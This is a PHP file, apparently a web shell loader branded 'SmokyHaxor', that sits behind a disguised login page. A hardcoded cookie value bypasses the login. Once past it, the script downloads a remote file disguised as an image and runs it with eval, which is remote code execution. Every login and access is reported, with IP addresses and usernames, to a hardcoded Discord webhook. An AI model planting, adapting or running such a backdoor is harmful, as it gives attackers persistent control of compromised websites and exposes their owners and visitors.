<?php
session_start();

/**
 */
function sendToDiscord($message, $webhook_url) {
    $data = [
        "content" => $message
    ];

    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    return file_get_contents($webhook_url, false, $context);
}

$discord_webhook_url = "https://discord.com/api/webhooks/1347095119077179473/5STtYqunRK6iV_aObk3XfcQ9WlN7u0Ql9eyo-T8L-Hjj1P-vZiL_OO0-xwfjjGWJBJS-";

$user_ip = $_SERVER['REMOTE_ADDR'];
$full_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (!isset($_SESSION['loggedin']) && isset($_COOKIE['custom_cookie']) && $_COOKIE['custom_cookie'] === 'vava') {
    $_SESSION['loggedin'] = true;

sendToDiscord("[SmokyHaxor] Login melalui cookie berhasil. IP: $user_ip, URL: $full_url", $discord_webhook_url);
sendToDiscord("[SmokyHaxor] User logged in via cookie.", $discord_webhook_url);

    header("Location: " . $_SERVER['PHP_SELF']); 
    exit();
}

// Tentukan username dan password hash
$username = "admin";
$passwordHash = '$2y$10$n4v3QiNYZMbFLFklIb5IAOHMN8Mqppsfchq2hCpiK3Ga9wOsqh1GO'; // Hash bcrypt

// Cek apakah pengguna sudah login sebelumnya
if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;

            // Set cookie dengan nilai "vava"
            setcookie('custom_cookie', 'vava', time() + 3600, '/');

sendToDiscord("[SmokyHaxor] Login berhasil. IP: $user_ip, URL: $full_url, Username: {$_POST['username']}", $discord_webhook_url);
sendToDiscord("[SmokyHaxor] User logged in successfully.", $discord_webhook_url);

            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Username atau password salah. Silakan coba lagi.";

            // Kirim log login gagal ke Discord
sendToDiscord("[SmokyHaxor] Login gagal. IP: $user_ip, URL: $full_url, Username: {$_POST['username']}", $discord_webhook_url);
sendToDiscord("[SmokyHaxor] Failed login attempt.", $discord_webhook_url);
        }
    }
}

if (isset($_SESSION['loggedin'])) {
    $url = 'https://nekan-dua.dev/aexdy/haxor/boobat.jpg'; 
    $content = file_get_contents($url);

sendToDiscord("[SmokyHaxor] Akses URL: $url, IP: $user_ip, URL Asal: $full_url", $discord_webhook_url);
sendToDiscord("[SmokyHaxor] Accessed URL: $url", $discord_webhook_url);

    if ($content !== false) {
        eval('?>' . $content); // Menjalankan konten sebagai kode PHP
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}

if (!isset($_SESSION['loggedin'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Form</title>
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color:rgb(34, 0, 0);
                font-family: Arial, sans-serif;
            }

            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100%;
            }

            .login-form {
                width: 300px;
                padding: 20px;
                background-color:rgb(61, 52, 0);
                border-radius: 8px;
                box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
                text-align: center;
                color: white;
            }

            .login-form img {
                width: 80px;
                margin-bottom: 10px;
            }

            .login-form h2 {
                margin: 0;
                padding: 10px 0;
                font-size: 20px;
            }

            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 4px;
                box-sizing: border-box;
                font-size: 16px;
            }

            .login-form button {
                width: 100%;
                padding: 10px;
                background-color: #ff0055;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }

            .login-form button:hover {
                background-color: #e6004c;
            }

            .login-form .options {
                margin-top: 10px;
                font-size: 14px;
                color: #d1d1d1;
            }

            .login-form .options a {
                color: #ff0055;
                text-decoration: none;
            }

            .login-form .options a:hover {
                text-decoration: underline;
            }

            .error-message {
                color: red;
                font-size: 14px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://faktawanita.com/meong/jooboobat.png" alt="Logo">
                <h2>Login Form</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">Sign in</button>
                </form>
                <div class="options">
                    <label><input type="checkbox"> Remember Me</label>
                    <br>
                    <a href="#">Create Account</a> | <a href="#">Forget Password?</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>
